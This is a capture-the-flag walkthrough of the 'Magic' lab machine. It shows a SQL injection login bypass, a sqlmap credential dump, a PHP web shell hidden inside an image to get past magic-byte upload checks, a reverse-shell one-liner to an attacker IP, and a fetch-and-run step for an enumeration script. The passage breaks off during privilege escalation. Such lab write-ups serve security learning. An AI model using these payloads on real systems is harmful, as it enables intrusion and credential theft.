# Brief Summary

Magic Mahcine has very realistic vulerbaility, specially the one that is related to web application.

# Nmap 

First I started with **nmap** tool and provided the option **`-A`**. 

here is the result:
```nmap
# Nmap 7.80 scan initiated Sat May 23 01:52:13 2020 as: nmap -A -oN nmap_scan-A 10.10.10.185
Nmap scan report for 10.10.10.185

```

It looks like we have two ports open for now.

# Enumeration

lets take a look at the application hosted on port **80** if any...

![1](/assets/magic/1.png)

if you noticed, in the bottom left corner there is a login button.


![2](/assets/magic/2.png)

Try default creds like 'admin:admin', but nothing worked.

lets started up **Burp Suite** and intercept the traffic and catpure the login request.

![3](/assets/magic/3.png)

now send it to repeater. (CTRL + R) will do it. Since we have the HTTP login request lets manipulate the paremeters. In other word, lets abuse them.

here is the paremeters:
```json
username=admin&password=admin
```

what will happen if we send single qoute before **admin** word...

it appears nothing changed in the response. `200 OK` is the server response. 

lets try by adding `' or '=` as this considered to be DB query. If we get different response or sql errer. Thats mostly means we have SQL Injection vulnerability.

```json
username=admin' or '=&password=admin
```

Nice, looks like we have a different response. A **redirection** from the server `HTTP/1.1 302 Found`.

![4](/assets/magic/4.png)

Now we can officially say that we have **SQL Injection** attack. 

# Initial Foothold, Sqli & Bypass File Upload Restriction 

lets grab the login HTTP request from **Repeater** in **Burp Suite** and save to a file.

start sqlmap tools with providing the following options:
```sqlmap
sqlmap -r file --threads 10 --batch --risk 3 --level 5 --dump-all
```
while this is running, let get to the **redirection** part. 

following redirection leads us to a page where upload functionality exists.

first thing comes to mind is file upload restriction issues, hence the name of the machine is "Magic" and a famous technique to prevent "malicious File Upload" in development word is called "Magic Number". 

Where a developer can implement "Magic Number" and chooses a specific type of files to be accepted and saved on the server. 

It called "Magic Number" becuase, it reads the first 4 bytes of the file. Matching it with file extenstion to determine whether to accept or refuse based on the extension and file signature that the developer hardcoded in the application.

Now lets try upload an image and look for the path of the uploaded image.

...

after uploading an image, i was able to see it in the landing page of the server. 

![5](/assets/magic/5.png)

click on the image to enlarge it. Then right click and select "copy image location" 

my image resulted in this path: http://10.10.10.185/images/uploads/Mr9pvq9.png


now lets redo the same steps we did, when tried to find **SQLI**. Grap the HTTP request in **Burp Suite** that uploads the image to the server, and send it to The repeater. 

playing with parameters to try to upload a shell on the server and attempt to executes by visiting the URL.

![6](/assets/magic/6.png)

chaning the extenstion to `.sh` isn't working. But what about adding a single qoute again `'` then following it with `.png` ? what could possibley happen? 

lets praper right for exploitation. first we need to get a small good php shell, better if one liner. 

here is a good one made by [KingSabri](https://github.com/KINGSABRI/WebShellConsole/blob/master/shells/shell.php) 

```php
<?=`$_GET[cmd]`?>
```
we can execute commands by using this parameter `?cmd=`

now lets upload our image and stop at the request going to the server by burp.

![7](/assets/magic/7.png)

keep the first line in the red sqaure and delete the rest (the first line will be different in your case).

by doing this, we keep the signature of the image file for the "Magic Number" to check. 

after the first line insert the following 

```php
<?=`$_GET[cmd]`?>
```

then the name of the file should be `a.php'.jpg`. the result should look like this..

![8](/assets/magic/8.png)

if we look at the response of this requst in burp, we find that the file has been uploaded with name `a.php'.jpg` 


![9](/assets/magic/9.png)

visiting the shell through this URL: 10.10.10.185/images/uploads/a.php'.jpg

we see some gibberish characters, which is the first line we left from the image. however, append this `?cmd=whoami` to the end of the url --> 10.10.10.185/images/uploads/a.php'.jpg?cmd=whoami

we can see that the user is **www-data**.

now lets look at sqlmap result then we get back to getting a reverse shell.

```sqlmap
Database: Magic
Table: login
[1 entry]
+----+----------+----------------+
| id | username | password       |
+----+----------+----------------+
| 1  | admin    | Th3s3usW4sK1ng |
+----+----------+----------------+

... (screen was diplected)


Database: information_schema
Table: USER_PRIVILEGES
[1 entry]
+-----------------------+--------------+---------------+----------------+
| GRANTEE               | IS_GRANTABLE | TABLE_CATALOG | PRIVILEGE_TYPE |
+-----------------------+--------------+---------------+----------------+
| 'theseus'@'localhost' | NO           | def           | USAGE          |
+-----------------------+--------------+---------------+----------------+


```
cool, it looks like we have some creds here and a username of the host. 


# Getting a Shell & User Own
trying ssh to the box

```terminal
The authenticity of host '10.10.10.185 (10.10.10.185)' cant be established.
ECDSA key fingerprint is SHA256:yx0Y6af8RGpG0bHr1AQtS+06uDomn1MMZVzpNaHEv0A.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.185' (ECDSA) to the list of known hosts.
theseus@10.10.10.185: Permission denied (publickey).
```

bad luck. our machine must be in the authorized_host file in order to get ssh connection.

good thing is that we have a shell we upload it to the server.

visiting the url: 10.10.10.185/images/uploads/a.php'.jpg?cmd=whoami

we get a result of 404 not found ?

there must be somehting that deletes our uplaoded files. 

lets redo the steps for uploading a shell and this time lets use this command 
```sh
php -r '$sock%3dfsockopen("ATTACKER IP",1234)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b'
``` 
and listen to on port 1234 with netcat. 


good, we have a shell. first thing, upgrading our shell is always a good habit. 
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
second lets make use of the previous creds that were colleteced.

```xterm
su - theseus
``` 

and supply 'theseus' the password that was found in the database 'Th3s3usW4sK1ng'

solid, now we have compromised theseus account. 

user.txt

```sh
theseus@ubuntu:~$ cat user.txt
cat user.txt
*******************3c1e26c2b91776
```

# Post Exploitation & Root Own

lets run linux enumeration scripts like [linpeas.sh]() 

downlowd the script and run 
```python
python3 -m http.server 80 --bind ATTACKER IP
``` 
in same dir that the script is located.

from theseuse box run the following:
```sh
theseus@ubuntu:~$ wget http://ATTACKER IP/linpeas.sh
theseus@ubuntu:~$ chmod 777 linpeas.sh
theseus@ubuntu:~$ ./LinEnum.sh
```

wait for the result..

and here looks like we got something interesting.

![10](/assets/magic/10.png)

let run this binary and see the output
